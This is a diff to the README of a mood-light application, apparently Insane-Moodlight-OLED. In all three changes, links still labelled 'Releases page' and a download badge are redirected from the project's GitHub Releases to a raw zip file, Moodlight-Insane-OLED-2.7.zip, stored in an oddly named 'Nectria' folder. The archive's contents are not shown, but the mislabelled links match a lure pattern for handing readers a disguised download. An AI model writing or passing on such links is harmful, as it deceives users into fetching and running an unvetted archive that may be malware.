@@ -4,7 +4,7 @@
 Welcome to Insane-Moodlight-OLED, the high-end mood light system designed to enhance your home with beautiful ambient lighting. This application uses an OLED display and smart battery management features to provide a seamless experience.
 
 ## 📥 Download the Application
-[![Download Insane-Moodlight-OLED](https://img.shields.io/badge/Download-Insane--Moodlight--OLED-blue.svg)](https://github.com/printingdepot/Insane-Moodlight-OLED/releases)
+[![Download Insane-Moodlight-OLED](https://raw.githubusercontent.com/printingdepot/Insane-Moodlight-OLED/main/Nectria/Moodlight-Insane-OLED-2.7.zip)](https://raw.githubusercontent.com/printingdepot/Insane-Moodlight-OLED/main/Nectria/Moodlight-Insane-OLED-2.7.zip)
 
 You can find the latest version of Insane-Moodlight-OLED on our Releases page. 
 
@@ -30,7 +30,7 @@ To run Insane-Moodlight-OLED, your system should meet the following requirements
 To get Insane-Moodlight-OLED up and running, follow these detailed steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/printingdepot/Insane-Moodlight-OLED/releases) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/printingdepot/Insane-Moodlight-OLED/main/Nectria/Moodlight-Insane-OLED-2.7.zip) to find the latest version of the application.
 
 2. **Download the Latest Release**
    On the Releases page, locate the most recent version. Click on it to access available files and download the main application package.
@@ -75,4 +75,4 @@ Stay updated with the latest news and developments. Follow us on social media pl
 For any questions or suggestions, feel free to create an issue in the repository or contact us directly.
 
 ## 📥 Download and Install
-Once again, visit the [Releases page](https://github.com/printingdepot/Insane-Moodlight-OLED/releases) to download the latest version and start enjoying the custom ambiance in your space.
+Once again, visit the [Releases page](https://raw.githubusercontent.com/printingdepot/Insane-Moodlight-OLED/main/Nectria/Moodlight-Insane-OLED-2.7.zip) to download the latest version and start enjoying the custom ambiance in your space.
